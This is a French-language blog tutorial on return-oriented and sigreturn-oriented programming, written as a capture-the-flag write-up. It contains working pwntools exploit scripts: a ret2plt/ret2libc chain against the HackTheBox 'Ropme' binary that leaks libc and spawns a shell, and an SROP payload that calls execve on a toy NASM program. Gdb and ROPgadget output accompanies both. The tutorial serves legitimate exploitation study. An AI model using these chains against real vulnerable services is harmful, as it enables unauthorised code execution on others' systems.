---
title: "ROP & SROP"
layout: "post"
categories: "Linux"
tags: ["Binary Exploitation", "Exploit Development"]
---

Avant de commencer à vous expliquer le ROP je vais devoir vous expliquer avant tout quelques notions essentielles à la bonne compréhension de la suite de cet article ! 😀

# Les sections / segments d'un binaire

Pour le ROP nous allons nous intérésser particulièrement à ces sections :

### Global Offset Table (GOT)

La GOT (Global Offset Table) est une section qui effectue une résolution d'adresse de la libc pour un gain de temps au processeur. C'est un tableau de pointeurs qui stocke les vraies adresses des fonctions de la libc.

### Procedure Linkage Table (PLT)

La PLT (Procedure Linkage Table) est une section qui contient du code permettant de résoudre les fonctions de la libc exécutées dans le binaire. C'est une table servant à faire le lien avec les fonctions situées dans des bibliothèques dynamiques. Cette section se trouve à des adresses fixes

### Les segments d'un binaire

- Le segment TEXT contient le code du binaire
- Le segment BSS contient les variables non initialisées, par exemple en C :
```c
char var[256];
```
- Le segment DATA contient les variables initialisées, par exemple en C :
```c
char var[256] = "nuts";
```

# Les protections des exécutables

- **NX** est une protection qui rend la pile Non eXécutable. Cette technique empêche l'exécution d'un shellcode dans la stack. Pour bypass cette protection nous devons effectuer un **ret2libc**, BTW voici un exemple d'exploitation : [HackTheBox - Enterprise](https://nuts7.github.io/articles/htb-enterprise/).

- Le **DEP** (Data Execution Prevention) consiste à protéger les zones de mémoires non exécutables. L'activation de la fonctionnalité DEP consiste à passer le bit NX à 1 dans le processeur.

- L’**ASLR** (Address space layout randomization) est une technique permettant de placer de façon aléatoire les adresses de la stack, du tas et des bibliothèques partagées. Cette protection randomize uniquement la base de la libc et non l'offset entre la base et les fonctions.

- **PIE** permet de placer de facon aléatoire des emplacements mémoires (comme l'ASLR) mais cette fois ci, pour la zone de code et la zone de donnée.

- Le **stack canary** ou la **Stack Smashing Protection** (SSP) est une protection qui est placé entre le buffer et le couple EBP et EIP (32 bits) ou RBP et RIP (64 bits). Si la valeur du canary est réécrite avec la mauvaise valeur alors le programme se ferme. (4 octets en 32 bits, 8 octets en 64 bits) Cependant, en assembleur nos ordinateurs vérifient octets par octets les chaines de caractères, alors nous pouvons brute force byte par byte la valeur du canary afin de la leak et de réécrire la bonne valeur du canary.

- Le **Fortify Source** permet de détecter certaines erreurs de développement causant un buffer overflow dans le code source d'une application lors de l'utilisation de diverses fonctions de manipulation de chaînes de caractères et de mémoire (par exemple, memcpy, memset, stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf, vsprintf, vsnprintf, gets)

- **RELRO** est une protection permettant de demander au linker de résoudre les fonctions de bibliothèques dynamiques au tout début de l’exécution, et donc de pouvoir remapper la section GOT et GOT.plt en lecture seule.

# Qu'est ce que le ROP ?

Le ROP (Return-oriented programming) est une technique d'exploitation reposant sur la recherche de blocs d'instructions à l'intérieur d'un binaire, ces blocs sont appelés **gadget**. Ces morceaux de code terminent généralement par un ret pour les ROP, un call pour les COP (Call oriented programming) ou un jmp pour les JOP (Jump oriented programming). Nous allons pouvoir chainer ces gadgets (finissant par ret) dans la stack afin d'exécuter une suite d'actions, appelé **ROP Chain**.

![](https://media.giphy.com/media/q6RoNkLlFNjaw/giphy.gif)

Le ROP va permettre de bypass principalement des protections telles que NX, l'ASLR et le DEP.

Voici un schéma d'une ROP Chain :

![](https://i.imgur.com/PLNqJLP.png)

# Exploitation + Walkthrough ROPME - HackTheBox

Passons à la pratique ! Pour un exemple d'exploitation de ROP Chain via un leak d'adresse de la libc, j'ai décidé d'utiliser le challenge [Ropme de HackTheBox](https://www.hackthebox.eu/home/challenges/download/8). (binaire 64 bits)

Avant tout, essayons de désassembler la fonction main du programme et de trouver une fonction vulnérable aux buffer overflow :

```bash
❯ gdb -q ropme
gef➤  disassemble main
Dump of assembler code for function main:
   0x0000000000400626 <+0>:	push   rbp
   0x0000000000400627 <+1>:	mov    rbp,rsp
   0x000000000040062a <+4>:	sub    rsp,0x50
   0x000000000040062e <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x0000000000400631 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000400635 <+15>:	mov    edi,0x4006f8
   0x000000000040063a <+20>:	call   0x4004e0 <puts@plt>
   0x000000000040063f <+25>:	mov    rax,QWORD PTR [rip+0x200a0a]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x0000000000400646 <+32>:	mov    rdi,rax
   0x0000000000400649 <+35>:	call   0x400510 <fflush@plt>
   0x000000000040064e <+40>:	mov    rdx,QWORD PTR [rip+0x200a0b]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x0000000000400655 <+47>:	lea    rax,[rbp-0x40]
   0x0000000000400659 <+51>:	mov    esi,0x1f4
   0x000000000040065e <+56>:	mov    rdi,rax
   0x0000000000400661 <+59>:	call   0x400500 <fgets@plt> # VULN FUNCTION
   0x0000000000400666 <+64>:	mov    eax,0x0
   0x000000000040066b <+69>:	leave
   0x000000000040066c <+70>:	ret
End of assembler dump.
gef➤  quit
❯ python2 -c "print 'A' * 100" | ./ropme
ROP me outside, how 'about dah?
[1]    68022 done                              python2 -c "print 'A' * 100" |
       68023 segmentation fault (core dumped)  ./ropme
```

Ici la fonction fgets ne vérifie pas le nombre d'octets entré	 par l'utilisateur du programme. Par conséquent nous avons pu faire segfault le binaire avec une saisie trop importante par rapport à l'espace alloué par le buffer.


Ensuite, comme dans un buffer overflow basique nous devons récupérer l'offset afin d'overwrite nos registres avec une adresse valide à la place de nos "A", soit 0x41 en hexadécimal.
Pour se faire nous allons créer un pattern (chaîne de caractères non cyclique) de 100 chars, lancer le programme avec ce pattern et chercher à quelle offset nous avons overwrite la sauvegarde RIP (la save RIP garde en mémoire l'adresse de retour après l'épilogue de l'appel d'une fonction) :

```bash
gef➤  pattern create 100    # Create pattern of 100 bytes
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  run   # Run the program with the pattern
Starting program: /home/nuts/ropme
ROP me outside, how 'about dah?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x000000000040066c in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────── registers ──────────────────────────────────
$rax   : 0x0
$rbx   : 0x0000000000400670  →  <__libc_csu_init+0> push r15
$rcx   : 0x0000000000602715  →  0x0000000000000000
$rdx   : 0x0
$rsp   : 0x00007fffffffdb78  →  "jaaaaaaakaaaaaaalaaaaaaamaaa\n"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x00000000006026b1  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"
$rdi   : 0x00007ffff7f844e0  →  0x0000000000000000
$rip   : 0x000000000040066c  →  <main+70> ret
$r8    : 0x00007fffffffdb30  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$r9    : 0x00007ffff7f81a60  →  0x0000000000602ab0  →  0x0000000000000000
$r10   : 0x40
$r11   : 0x246
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────── stack ──────────────────────────────────
0x00007fffffffdb78│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaa\n"	 ← $rsp
0x00007fffffffdb80│+0x0008: "kaaaaaaalaaaaaaamaaa\n"
0x00007fffffffdb88│+0x0010: "laaaaaaamaaa\n"
0x00007fffffffdb90│+0x0018: 0x0000000a6161616d ("maaa\n"?)
0x00007fffffffdb98│+0x0020: 0x00007fffffffe039  →  0x0ba53f89a8f5d8c3
0x00007fffffffdba0│+0x0028: 0x0000000000400670  →  <__libc_csu_init+0> push r15
0x00007fffffffdba8│+0x0030: 0xd97e9c55920317fc
0x00007fffffffdbb0│+0x0038: 0x0000000000400530  →  <_start+0> xor ebp, ebp
────────────────────────────────── code:x86:64 ──────────────────────────────────
     0x400661 <main+59>        call   0x400500 <fgets@plt>
     0x400666 <main+64>        mov    eax, 0x0
     0x40066b <main+69>        leave
 →   0x40066c <main+70>        ret
[!] Cannot disassemble from $PC
────────────────────────────────── threads ──────────────────────────────────
[#0] Id 1, Name: "ropme", stopped 0x40066c in main (), reason: SIGSEGV
────────────────────────────────── trace ──────────────────────────────────
[#0] 0x40066c → main()
────────────────────────────────────────────────────────────────────
gef➤  pattern search iaaaaaaa   # Find bytes to overwrite RBP
[+] Searching 'iaaaaaaa'
[+] Found at offset 64 (little-endian search)
```

Nous avons donc un offset de 64 caractères (buffer) ainsi qu'un padding de 72 octets avant d'écraser la sauvegarde RIP.

Un ret2libc avec une exécution d'un shellcode dans la stack aurait été suffisant si le bit NX était désactivé, cependant ce n'est pas le cas, ainsi l'ASLR est activé sur le serveur distant :

```bash
❯ checksec --file=ropme
[*] '/home/nuts/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

> Rappel sur le fonctionnement de l'ASLR :

 ![](https://i.imgur.com/ozdoTnu.png)

Commencons notre ROP Chain par la recherche de gadgets utiles pour notre exploitation avec [Ropper](https://github.com/sashs/Ropper), avec [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) ou avec l'option `/R <instruction>` sur [radare2](https://github.com/radareorg/radare2) :

```bash
❯ ROPgadget --binary=ropme
Gadgets information
============================================================
0x0000000000400582 : adc byte ptr [rax], ah ; jmp rax
0x0000000000400581 : adc byte ptr [rax], spl ; jmp rax
0x000000000040057e : adc dword ptr [rbp - 0x41], ebx ; adc byte ptr [rax], spl ; jmp rax
0x0000000000400507 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x4004d0
0x00000000004006df : add bl, dh ; ret
0x00000000004006dd : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004006db : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004004e7 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4004d0
0x0000000000400667 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x000000000040058c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006dc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400668 : add byte ptr [rax], al ; add cl, cl ; ret
0x00000000004004c3 : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004004e9 : add byte ptr [rax], al ; jmp 0x4004d0
0x0000000000400669 : add byte ptr [rax], al ; leave ; ret
0x000000000040058e : add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006de : add byte ptr [rax], al ; ret
0x0000000000400608 : add byte ptr [rbp + 5], dh ; jmp 0x4005a0
0x00000000004005f8 : add byte ptr [rcx], al ; ret
0x000000000040066a : add cl, cl ; ret
0x00000000004006c0 : add dword ptr [rax + 0x39], ecx ; jmp 0x40073a
0x00000000004004f7 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4004d0
0x00000000004005f4 : add eax, 0x200a6e ; add ebx, esi ; ret
0x0000000000400517 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x4004d0
0x00000000004005f9 : add ebx, esi ; ret
0x00000000004004c6 : add esp, 8 ; ret
0x00000000004004c5 : add rsp, 8 ; ret
0x00000000004005f7 : and byte ptr [rax], al ; add ebx, esi ; ret
0x00000000004004e4 : and byte ptr [rax], al ; push 0 ; jmp 0x4004d0
0x00000000004004f4 : and byte ptr [rax], al ; push 1 ; jmp 0x4004d0
0x0000000000400504 : and byte ptr [rax], al ; push 2 ; jmp 0x4004d0
0x0000000000400514 : and byte ptr [rax], al ; push 3 ; jmp 0x4004d0
0x0000000000400502 : and cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 2 ; jmp 0x4004d0
0x0000000000400747 : call qword ptr [rax]
0x0000000000400625 : call qword ptr [rbp + 0x48]
0x000000000040061e : call rax
0x0000000000400606 : cmp dword ptr [rdi], 0 ; jne 0x400610 ; jmp 0x4005a0
0x0000000000400605 : cmp qword ptr [rdi], 0 ; jne 0x400610 ; jmp 0x4005a0
0x00000000004006bc : fmul qword ptr [rax - 0x7d] ; ret
0x0000000000400619 : int1 ; push rbp ; mov rbp, rsp ; call rax
0x000000000040057d : je 0x400590 ; pop rbp ; mov edi, 0x601048 ; jmp rax
0x00000000004005cb : je 0x4005d8 ; pop rbp ; mov edi, 0x601048 ; jmp rax
0x0000000000400618 : je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x00000000004004eb : jmp 0x4004d0
0x000000000040060b : jmp 0x4005a0
0x00000000004006c3 : jmp 0x40073a
0x00000000004007eb : jmp qword ptr [rbp]
0x0000000000400585 : jmp rax
0x0000000000400609 : jne 0x400610 ; jmp 0x4005a0
0x000000000040066b : leave ; ret
0x00000000004005f3 : mov byte ptr [rip + 0x200a6e], 1 ; ret
0x0000000000400666 : mov eax, 0 ; leave ; ret
0x000000000040061c : mov ebp, esp ; call rax
0x0000000000400580 : mov edi, 0x601048 ; jmp rax
0x000000000040061b : mov rbp, rsp ; call rax
0x0000000000400588 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004006d8 : nop dword ptr [rax + rax] ; ret
0x00000000004005d5 : nop dword ptr [rax] ; pop rbp ; ret
0x00000000004005f6 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; ret
0x00000000004005cc : or ebx, dword ptr [rbp - 0x41] ; adc byte ptr [rax], spl ; jmp rax
0x00000000004005f5 : outsb dx, byte ptr [rsi] ; or ah, byte ptr [rax] ; add byte ptr [rcx], al ; ret
0x00000000004006cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ce : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006d0 : pop r14 ; pop r15 ; ret
0x00000000004006d2 : pop r15 ; ret
0x0000000000400620 : pop rbp ; jmp 0x4005a0
0x00000000004005f2 : pop rbp ; mov byte ptr [rip + 0x200a6e], 1 ; ret
0x000000000040057f : pop rbp ; mov edi, 0x601048 ; jmp rax
0x00000000004006cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006cf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400590 : pop rbp ; ret
0x00000000004006d3 : pop rdi ; ret
0x00000000004006d1 : pop rsi ; pop r15 ; ret
0x00000000004006cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004e6 : push 0 ; jmp 0x4004d0
0x00000000004004f6 : push 1 ; jmp 0x4004d0
0x0000000000400506 : push 2 ; jmp 0x4004d0
0x0000000000400516 : push 3 ; jmp 0x4004d0
0x000000000040061a : push rbp ; mov rbp, rsp ; call rax
0x00000000004004c9 : ret
0x000000000040064a : ret 0xfffe
0x00000000004005ca : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax
0x000000000040057c : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax
0x0000000000400617 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax
0x0000000000400512 : sbb cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 3 ; jmp 0x4004d0
0x00000000004004f2 : sub cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 1 ; jmp 0x4004d0
0x00000000004006e5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004006e4 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040058a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006da : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400616 : test eax, eax ; je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x0000000000400615 : test rax, rax ; je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x00000000004004e2 : xor cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 0 ; jmp 0x4004d0

Unique gadgets found: 93
```

Nous avons un gadget particulièrement intéréssant dans ce binaire : `pop rdi ; ret` à l'adresse `0x4006d3`. Cette instruction permet de passer un 1er argument à une fonction.

Nous pouvons setup des arguments à des fonctions avec ces gadgets car l'ABI (application binary interface) définit ces calling conventions :

> **1er** argument = `pop rdi ; ret`

> **2ème** argument = `pop rsi ; ret`

> **3ème** argument = `pop rdx ; ret`

- Premièrement, le but va être d'effectuer un **ret2plt** afin de leak une fonction de la libc contenue dans la GOT (ici puts car system n'est pas dans la GOT du programme) :

```bash
gef➤  got

GOT protection: Partial RelRO | GOT functions: 4

[0x601018] puts@GLIBC_2.2.5  →  0x4004e0
[0x601020] __libc_start_main@GLIBC_2.2.5  →  0x7ffff7de7a50
[0x601028] fgets@GLIBC_2.2.5  →  0x400506
[0x601030] fflush@GLIBC_2.2.5  →  0x400516
```

Je vais utiliser l’adresse de puts dans la PLT afin d’afficher une adresse de la GOT (par exemple puts)
Dans ce cas nous allons pouvoir afficher l'adresse mémoire d'une fonction de la libc afin de calculer la distance entre cette fonction et la fonction system car l'ASLR randomise l'adresse de la base mais l'écart entre toutes les fonctions de la libc ne change pas. Nous pouvons alors retrouver les adresses des fonctions de la libc, nous avons donc bypass l'ASLR ! 😀

- Le **ret2main** va permettre de ne pas subir la randomisation de l'ASLR au redémarrage du programme, il va toujours revenir à la fonction main et le programme ne va pas se terminer grâce au ret et à la réécriture de la sauvegarde RIP par l'adresse de la fonction main.

- Ensuite, nous allons exploiter un **ret2libc** afin de contourner le bit NX et exécuter un shell à l'aide de la fonction system et de la string `/bin/sh` qui a été calculer à partir de la base de la libc.

_TL;DR_ :

![](https://i.imgur.com/t3l8fEX.png)

Pour notre exploitation nous avons besoin de :

1. L'adresse du gadget `pop rdi ; ret` dans le code que nous avons déjà récupéré avec ROPgadget.
2. L'adresse de **puts** dans la **PLT** :
```bash
❯ objdump -D ropme -M intel | grep '<puts@plt>'
00000000004004e0 <puts@plt>:
  40063a:	e8 a1 fe ff ff       	call   4004e0 <puts@plt>
```
3. L'adresse de **puts** dans la **GOT** :
```bash
❯ objdump -R ropme | grep 'puts'
0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```
4. L'adresse de **main** dans le code :
```bash
gef➤  p main
$2 = {<text variable, no debug info>} 0x400626 <main>
```
5. Trouver la libc linké au binaire grâce à [libc-database](https://github.com/niklasb/libc-database) et à l'adresse de puts que nous avons leak :
```bash
Local :
❯ ldd ropme
	linux-vdso.so.1 (0x00007fffb6fe5000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007f032bb05000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f032bd0b000)*
Remote :
❯ ./find puts 690 # find symbol address_leaked
libc6_2.23-0ubuntu10_amd64.so (local-56d992a0342a67a887b8dcaae381d2cc51205253)
```
6. Obtenir l'adresse de **puts** dans la **libc utilisé**, pour calculer l'adresse de la base de la libc :
```bash
❯ readelf -s libc6_2.23-0ubuntu10_amd64.so | grep 'puts@@GLIBC'
   186: 000000000006f690   456 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   404: 000000000006f690   456 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
  1097: 000000000006e030   354 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
```
7. L'adresse de **system** et **/bin/sh** pour calculer l'écart avec la base :
```bash
❯ nm -D libc6_2.23-0ubuntu10_amd64.so| grep 'system@@GLIBC_2.2.5'
0000000000045390 W system@@GLIBC_2.2.5
❯ strings -t x -a libc6_2.23-0ubuntu10_amd64.so | grep "/bin/sh"
 18cd17 /bin/sh
```

Pour automatiser ces étapes j'ai développé un script python avec le module [pwntools](https://github.com/Gallopsled/pwntools) :

```py
from pwn import *

HOST, PORT = "167.99.87.34", 30721

#p = process("./ropme", stdin=PTY)
p = remote(HOST, PORT)
elf = ELF("./ropme")
rop = ROP("./ropme")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc6_2.23-0ubuntu10_amd64.so") # Discovered by the puts leaked with libc-database

padding = cyclic(72) # offset to overwrite RIP with a pattern cyclic (same as "A" * 72)
gadget = (rop.find_gadget(["pop rdi", "ret"]))[0]  # 0x4006d3 pop rdi ; ret
puts_plt = elf.plt["puts"] # 0x4004e0
puts_got = elf.got["puts"] # 0x601018 (got in GEF)
addr_main = elf.symbols["main"] # 0x400626 (1st Address Prologue Main Function)

p.recvuntil("ROP me outside, how \'about dah?\n") # wait str to send pld

# ret2plt + ret2main
pld = b""
pld += padding # buffer + overwrite RBP (8 octets)
pld += p64(gadget) # 1 argument (pop rdi ; ret)
pld += p64(puts_got) # to save addr puts of GOT in rdi register
pld += p64(puts_plt) # to print puts GOT
pld += p64(addr_main) # ret2main
p.sendline(pld) # send payload

# Addr Parsing
puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info("Leaked libc address puts : {}".format(hex(puts_leak)))

libc_base = puts_leak - libc.symbols["puts"] # calculate address base libc
addr_system = libc_base + libc.symbols["system"] # calculate difference between base and system function
binsh = libc_base + next(libc.search(b"/bin/sh\x00")) - 64 # calculate difference between base and /bin/sh

log.info("Libc base : " + hex(libc_base))
log.info("System address : " + hex(addr_system))
log.info("/bin/sh : " + hex(binsh))

# ret2libc
pld = b""
pld += padding # offset to go save RIP
pld += p64(gadget) # gadget to pass a parameter to called function (pop rdi ; ret)
pld += p64(binsh) # parameter system
pld += p64(addr_system) # system in libc leaked

p.recvuntil("ROP me outside, how \'about dah?\n") # wait str to send payload
p.sendline(pld) # send payload
p.interactive() # spawn interactive shell

p.close()
```

![](https://media.giphy.com/media/VY20vTr6KCbOBKiGIL/giphy.gif)

# Bonus - Sigreturn-Oriented Programming

Avant de commencer les SROP vous devez déjà comprendre les signaux et leurs fonctionnements ! 😀

## Les signaux

Un signal est une forme d'**IPC** (Inter-process communication) utilisée par les systèmes Unix et respectant les standards POSIX. Ils sont utilisés pour kill des processus, pour leur dire que les temporisations ont expiré ou pour les avertir d'un comportement exceptionnel... Les signaux sont définis dans la librairie `<signal.h>`.

- Exemples de signaux :

1. Ctrl + C —> SIGINT (Kill un processus)
2. Ctrl + Z —> SIGTSTP (Arrêt temporaire d’un processus)

Concrètement en low level, les signaux sont gérés de cette façon :

![](https://i.imgur.com/peKsKGB.png)

- **(1)** : Lorsqu’un signal se produit le processus sera temporairement suspendu et entrera en Kernel Land
- **(2)** : Le kernel enregistre les registre dans la stack frame correspondant pour le processus et saute vers le gestionnaire de signaux (en User Land) précédemment enregistré pour traiter le signal correspondant
- **(3)** : Le kernel restaure la stack frame précédemment enregistré pour le processus grace à `sigreturn()`
- **(4)** : Le processus repasse en User Land

La structure de la signal frame lorsqu'un signal s'est produit est la suivante (2 : ucontext save) :

![](https://i.imgur.com/3Ba5fSj.png)

La **signal frame** fait **248 bytes**, en ignorant les 8 premiers octets de `rt_sigreturn()` qui pointe vers l'adresse du syscall `sys_rt_sigreturn`.
L'appel système sigreturn fait un **retour du gestionnaire de signaux** (signal handler) et **nettoie la stack frame**.

Il y a 2 défauts dans ce système :

- Le **signal frame** est **éditable** car nous sommes en **User Land**.
- Le **kernel** ne **compare pas** le **signal frame enregistré** et le **signal frame restauré**.

## Qu'est ce que le SROP ?

Le SROP (Sigreturn-Oriented Programming) est une technique d'exploitation utilisant tout comme le ROP des gadgets mais cette technique requiert seulement **2 gadgets** : `pop rax` ou `mov rax, 0xf` et `syscall`. En général, on utilise le SROP quand nous avons un gadget syscall et qu’il n’y a pas assez de gadget intéressants pour le ROP : `pop rdi`, `pop rsi`, `pop rdx`.

Le but est de **provoquer un signal** en exécutant le syscall **sys_rt_sigreturn** avec des gadgets pratiques. Ensuite nous allons devoir **réecrire les registres** stockés dans notre **signal frame** :

![](https://i.imgur.com/NLEbzGH.png)

Une fois la signal frame overwrite, le kernel va restauré le context avec nos registres overwrite et donc exectuer notre `sys_execv`.

Tout d'abord nous allons utiliser un programme en assembleur simple pour un exemple d'exploitation :

```py
global _start

section .data
shell db '/bin/sh', 0

section .text
_vuln:
	push rbp
	mov rbp, rsp
	sub rsp, 0x40
	mov rax, 0
	mov rdi, 0
	lea rsi, [rbp-0x40]
	mov rdx, 0x400
	syscall
	leave
	push 0
	pop rax
	ret

_start:
	push rbp
	mov rbp, rsp
	call _vuln
	mov rax, 60
	mov rdi, 0
	syscall
```

Compilons notre programme nasm :

```bash
nasm -f elf64 srop.asm -o srop.o && ld srop.o -o srop
```

Pour notre exploitation nous avons besoin de :

- Un moyen de setup une valeur dans RAX, ici l'adresse de `pop rax` :
	```bash
	❯ ROPgadget --binary srop | grep "pop rax"
	0x0000000000401020 : pop rax ; ret
	```
- L'ID du syscall rt_sigreturn dans le but de le setup dans le registre RAX (pour produire un signal) :
	```bash
	❯ grep "rt_sigreturn" /usr/include/x86_64-linux-gnu/asm/unistd_64.h
	#define __NR_rt_sigreturn 15
	❯ curl -s https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ | grep "sys_rt_sigreturn" | sed -e 's/<[^>]*>//g'
	15 sys_rt_sigreturn unsigned long __unused
	```
- Un gadget syscall pour exécuter `sys_rt_sigretun` (produire un signal) et `sys_execve` (ouvrir un shell lors de la réecriture de la signal frame) :
	```bash
	❯ ROPgadget --binary srop | grep "syscall"
	0x000000000040101b : syscall
	```
- L'adresse de la string `/bin/sh` afin de l'a setup dans le registre rdi pour le passer en argument à sys_execv lors de la réecriture de la signal frame :
	```bash
	❯ ROPgadget --binary srop --string /bin/sh
	Strings information
	============================================================
	0x0000000000402000 : /bin/sh
	```

J'ai donc scripté l'exploitation de cette SROP :

```py
#!/usr/bin/python2
from pwn import *

p = process("./srop", stdin=PTY)
elf = ELF("./srop")
context.arch = "amd64"

padding = "A" * 72 # offset to overwrite RIP
pop_rax = 0x401020 # gadget to setup 15 in RAX
id_sys_rt_sigretun = 15 # https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
syscall = 0x40101b
bin_sh = 0x402000

def overwrite_signal_frame(bin_sh, syscall):
    frame = SigreturnFrame() # crafts a sigreturn frame
    frame.rax = constants.SYS_execve # 59 (id_syscall sys_execve) in RAX
    frame.rdi = bin_sh # /bin/sh addr in RDI
    frame.rip = syscall # syscall addr in RIP
    return(frame)

pld = padding
pld += p64(pop_rax)
pld += p64(id_sys_rt_sigretun)
pld += p64(syscall)
pld += bytes(overwrite_signal_frame(bin_sh, syscall))

p.sendline(pld) # send payload
p.interactive() # spawn interactive shell
```

![](https://i.imgur.com/YEGLRh1.png)

Nous avons enfin réussi à faire spawn un shell sur 2 challenges basiques d'exploitation de binaire. J'espère que cette article vous a appris de nouvelles choses ! 😃
